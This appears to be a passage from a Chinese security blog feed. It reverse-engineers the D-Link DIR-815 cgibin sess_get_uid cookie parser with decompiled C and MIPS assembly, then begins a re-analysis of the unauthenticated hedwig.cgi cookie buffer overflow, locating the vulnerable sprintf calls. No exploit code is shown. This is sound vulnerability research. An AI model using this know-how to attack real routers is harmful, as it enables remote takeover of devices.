    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>SUB_00402290<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> uVar1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>反汇编结果不好，直接看下面MIPS汇编代码分析：</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                                          # sess_get_uid<span class="token operator">+</span>234p
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                                          # DATA XREF<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                 lui     $gp<span class="token punctuation">,</span> <span class="token number">0x43</span>  # <span class="token string">'C'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B4                 bnez    $a0<span class="token punctuation">,</span> loc_40E4C4 <span class="token comment" spellcheck="true">//第一个参数也就是string_new不为0则跳转</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B8                 li      $gp<span class="token punctuation">,</span> <span class="token number">0x4346D0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4BC                 jr      $ra
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C0                 li      $v0<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4  # <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4 loc_40E4C4<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strcmp<span class="token operator">+</span>4j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4                 lw      $a0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//获取string_ new0x14处的内容也就是字符串的内容</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C8                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4CC                 bnez    $a0<span class="token punctuation">,</span> loc_40E4D8<span class="token comment" spellcheck="true">//0x14处不为0则跳转loc_40E4D8</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D0                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D4                 addiu   $a0<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # s1
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8 loc_40E4D8<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strcmp<span class="token operator">+</span>1Cj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8                 la      $t9<span class="token punctuation">,</span> strcmp <span class="token comment" spellcheck="true">//进入strcmp进行比较</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4DC                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4E0                 jr      $t9 <span class="token punctuation">;</span> strcmp
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4E4                 nop</code></pre>
<p>该函数的作用比较string_new的0x14处的字符串是否=’uid’。   </p>
<h2 id="sobj-get-string-int-param-1"><a href="#sobj-get-string-int-param-1" class="headerlink" title="sobj_get_string(int param_1)"></a>sobj_get_string(int param_1)</h2><p>该函数的参数只有一个是sobj_new()申请结构体的地址   </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sobj_get_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>

  iVar1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    iVar1 <span class="token operator">=</span> <span class="token number">0x419b10</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>汇编代码：</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>globl sobj_get_string
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC sobj_get_string<span class="token punctuation">:</span>                         # CODE XREF<span class="token punctuation">:</span> sub_403794<span class="token operator">+</span>8Cp
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC                                          # sub_403BC8<span class="token operator">+</span>4FCp <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC                 beqz    $a0<span class="token punctuation">,</span> locret_40E1EC <span class="token comment" spellcheck="true">//为0跳转0x40E1EC</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D0                 move    $v1<span class="token punctuation">,</span> $zero
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D4                 lw      $v0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将0x14处的地址赋给v0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D8                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1DC                 bnez    $v0<span class="token punctuation">,</span> locret_40E1EC 
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E0                 move    $v1<span class="token punctuation">,</span> $v0 <span class="token comment" spellcheck="true">//v0给v1</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E4                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E8                 addiu   $v1<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # <span class="token string">""</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC locret_40E1EC<span class="token punctuation">:</span>                           # CODE XREF<span class="token punctuation">:</span> sobj_get_stringj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC                                          # sobj_get_string<span class="token operator">+</span>10j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC                 jr      $ra <span class="token comment" spellcheck="true">//v1给v0，然后出去了返回值就是v0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1F0                 move    $v0<span class="token punctuation">,</span> $v1 
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1F0  # End of function sobj_get_string</code></pre>
<p>可以看出该函数的作用是获取参数（sobj_new()中0x14处的堆）的字符串,返回值是v0=sobj_new()中0x14的值。 </p>
<h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>从环境变量中获取对应值：例如getenv(“HTTP_COOKIE”)则函数返回值v0中存放着返回的HTTP_COOKIE=之后的‘uid=xxxxxx’</p>
<p>例如运行前a0是参数是0x41A5cc(0x41a5cc存放的就是字符串’HTTP_COOKIE’)</p>
<p><img src="getenv()1.png" alt=""></p>
<p>getenv()运行完了之后返回结果存放在V0处</p>
<p><img src="getenv()2.png" alt=""></p>
<p> V0=0x76fff32b </p>
<p><img src="getenv()3.png" alt=""></p>
<p>往前一些可以看到0x76fff31f中明显可以看到HTTP_COOKIE=uid=xxxx</p>
<p><img src="getenv()4.png" alt=""></p>
<p>  getenv()也就是将环境变量=之后的内容取出</p>
<h1 id="sess-get-uid-undefined4-param-1"><a href="#sess-get-uid-undefined4-param-1" class="headerlink" title="sess_get_uid(undefined4 param_1)"></a>sess_get_uid(undefined4 param_1)</h1><p>最后整体分析一下sess_get_uid()函数，该函数的参数是上一个sobj_new()的结构体地址   </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sess_get_uid</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">//param_1 = a0 = s5 = 0x42e008是sess_get_uid()上一个sobj_new()的返回值</span>
  <span class="token keyword">int</span> string_new<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>strings_new_addr<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>http_cookie<span class="token punctuation">;</span>
  undefined4 uVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar2<span class="token punctuation">;</span>
  <span class="token keyword">int</span> http_cookie_addr<span class="token punctuation">;</span>
  uint flag<span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>pcVar3<span class="token punctuation">;</span>

  string_new <span class="token operator">=</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//运行完第一次sobj_new()，v0 = 0x42e048并s2 = v0 = 0x42e048</span>
  strings_new_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第二次运行完sobj_new()，v0 = 0x42e068</span>
  http_cookie <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_COOKIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//v0= 'uid=' 将HTTP_COOKIE=后面的值取出，s3 = v0</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string_new <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>strings_new_addr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>http_cookie <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第一个状态</span>
LAB_00407e28<span class="token punctuation">:</span>
    http_cookie_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>http_cookie<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407ec4<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果达到结尾/x00处的时候进入0x407ec4</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
LAB_00407db0<span class="token punctuation">:</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//第一个状态之后进入此处判断是否为';'</span>
        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* 遇到= */</span>
        flag <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当遇到'='号时，flag = 2 进入第三个状态</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">!=</span> <span class="token number">0x3d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果也不是等号就将字符放入第一个sobj_new生成的0x42e048对应的0x14申请的堆空间存储</span>
          <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span>http_cookie_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
          flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//并且将状态标准转化为1进入第二个状态，然后一直加直到把'uid'加进去，遇到等号之后直接跳到LAB_00407e24，跳过'='</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//第一个进入的状态</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">!=</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">sobj_free</span><span class="token punctuation">(</span>string_new<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将s2 = 0x42e048也就是第一次sobj_new生成结构体中的0x14处的堆释放掉并清0</span>
            <span class="token function">sobj_free</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将s3 = 0x42e068也就是第二次sobj_new生成结构体中的0x14处的堆释放掉并清0</span>
            <span class="token keyword">goto</span> LAB_00407db0<span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//进入第三个状态</span>
                    <span class="token comment" spellcheck="true">/* 遇到=后紧接着遇到; */</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//遇到分号进入状态四</span>
          flag <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">,</span>http_cookie_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将uid=之后内容存入s3 = 0x42e068也就是第二次sobj_new生成结构体中的0x14处的堆中，将不等于';'的字符全部输入</span>
        http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* 遇到分号之后比较是否当前字符串是否是uid= */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//进入状态四，比较第一次sobj_new()的s2 = 0x42e048中0x14处的内容是不是'uid'</span>
        iVar1 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span>
        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e40<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
LAB_00407e24<span class="token punctuation">:</span>
    http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
LAB_00407ee0<span class="token punctuation">:</span>
  pcVar3 <span class="token operator">=</span> getenv<span class="token punctuation">;</span>
  pcVar2 <span class="token operator">=</span> <span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">;</span>
LAB_00407e48<span class="token punctuation">:</span>
  uVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>pcVar3<span class="token punctuation">)</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//sobj_get_string(strings_new_addr)获取第二次运行完sobj_new()，s3 = v0 = 0x42e068中0x14处堆中的字符串</span>
  <span class="token function">sobj_add_string</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>uVar1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将得到字符串拷贝到param_1 = s5 = 0x42e008是sess_get_uid()上一个sobj_new()的0x14处堆空间中</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>string_new <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">sobj_del</span><span class="token punctuation">(</span>string_new<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>strings_new_addr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x00407ebc. Too many branches */</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>
    <span class="token function">sobj_del</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
LAB_00407ec4<span class="token punctuation">:</span>
  iVar1 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进入状态四，比较第一次sobj_new()的s2 = 0x42e048中0x14处的内容是不是'uid'</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
LAB_00407e40<span class="token punctuation">:</span>
    pcVar3 <span class="token operator">=</span> sobj_get_string<span class="token punctuation">;</span>
    pcVar2 <span class="token operator">=</span> strings_new_addr<span class="token punctuation">;</span>
    <span class="token keyword">goto</span> LAB_00407e48<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">goto</span> LAB_00407ee0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>纵观整个函数的功能就是将uid=后面的内容拷贝到param_1的0x14处的堆地址空间。函数的参数是之前sobj_new()申请的结构体地址，地址存储在s5寄存器中，进入函数之后又存储在了s6中。   </p>
<p>完整的流程是：</p>
<p>首先通过两次sobj_new()申请两个结构体并将地址分别存储在s2,s3中。之后利用getenv()将环境变量”HTTP_COOKIE”中的内容也就是’uid=xxxx’字符串的地址放在v0中，紧接着s1=0，s5=0x3b(分号’;’)，s7=0x20(空格’ ‘)其中寄存器s1中存着的是状态标志，不同状态标志进行不同的处理。</p>
<p>s1=0标志着初始状态也就是第一个状态，先判断HTTP_COOKIE环境变量中第一个字符是否是空格，是空格则跳过继续判断，不是空格则先通过sobj_free()将sobj_new()申请的结构体0x14处的堆free并清0。跳转到0x00407db0判断不为0x3b(分号；)，继续判断是否0x3d(等号)，如果都不是，则将该字符通过sobj_add_char()存储在s2中0x14处的堆中，并将s1=1，标志着进入第二个状态。</p>
<p>s1=1第二个状态，不断读取字符串内容直到遇到0x3d(等号)，遇到等号则跳过等号并且s1=2，进入第三个状态。正常而言结束第二个状态时s2+0x14中应该存储的是’uid’。</p>
<p>s1=2第三个状态，将’uid=’之后的字符串内容通过sobj_add_char()存储在s3中0x14处的堆中。如果遇到字符等于0x3b(分号)则将s1=3进入第四个状态，正常结束状态是到遇到结束字符’\x00’处。</p>
<p>s1=3第四个状态，比较s2 = 0x42e048中0x14处的内容是不是’uid’。不是则跳过该字符，并且s1=0重新开始。如果s2 = 0x42e048中0x14处的内容是’uid’。则通过sobj_get_string()将s3中0x14处堆的字符串地址作为返回值给v0。   </p>
<p>之后通过sobj_add_string()将v0的内容给s6的0x14处。到此完成了uid中的内容的获取。最后就是利用sobj_del()将s2、s3中的内容给释放并清空。   </p>
<p>函数返回时，uid的内容存储在之前sobj_new()的结构体s5=0x42e008的0x14处。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实这算第一次这样仔细的阅读并调试汇编源码（虽然还是借助了ghidra的反汇编功能进行理解），还是太菜了呀，整个过程还是花了挺多时间的，但现在看来感觉还是挺值的，因为整个流程下来我对MIPS汇编代码理解以及寄存器的运用还有gdb、IDA的联调有了相对熟练的掌握，为以后静态和动态分析开一个好头吧！然后这篇文章的目的也是为了整理梳理整个思路然后以文字的形式记录下来。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
      </tags>
  </entry>
  <entry>
    <title>DIR815缓冲区溢出漏洞再分析</title>
    <url>/2020/05/15/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年这个时候第一次分析这个漏洞，当时跟着0day那本书一步一步跟着调试和分析，分别从qemu用户模式、qemu系统模式和Firmadyne仿真以及实体机上都试了，结果写的exp还是没有getshell，时隔一年再次分析较上次有一定收获啦，并且打算系统总结一下MIPS架构路由器漏洞挖掘了。</p>
<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
<p>Buffer overflow on “hedwig.cgi”<br>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
</blockquote>
<p>D-Link官方安全公告：从漏洞公告中可以看出，该漏洞存在于名为”hedwig.cgi”的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个超长的Cookie值，使得程序栈溢出，从而获得路由器的远程控制权限。   </p>
<p>具体详细内容可以在《揭秘家用路由器0day漏洞挖掘技术》一书中找到，接下来我们直接定位漏洞触发函数并进行一系列分析</p>
<h1 id="固件获取及漏洞定位"><a href="#固件获取及漏洞定位" class="headerlink" title="固件获取及漏洞定位"></a>固件获取及漏洞定位</h1><p>调试环境：ubuntu16.04 x64和x32，IDA6.8和7.0，qemu2.5</p>
<p>固件下载地址：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></p>
<h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><p><code>binwalk -Me</code>解压 </p>
<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cbinwalk.png" alt="">  </p>
<h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cfind-name.png" alt=""></p>
<p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>，</p>
<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Chttp_cookie.png" alt="">可以找到有一个函数，就是<code>sess_get_uid</code>，分析一下这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>后面的部分，</p>
<p>然后看一下交叉引用，找到了<code>hedwigcgi_main</code>函数中，我们可以知道就是后面的<code>sprintf</code>函数引起了栈溢出，但是这个仔细看后面的代码，可以知道，后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，所以我们可以得出结论，这块也就是这个漏洞的漏洞点。如下面两张图所示 </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
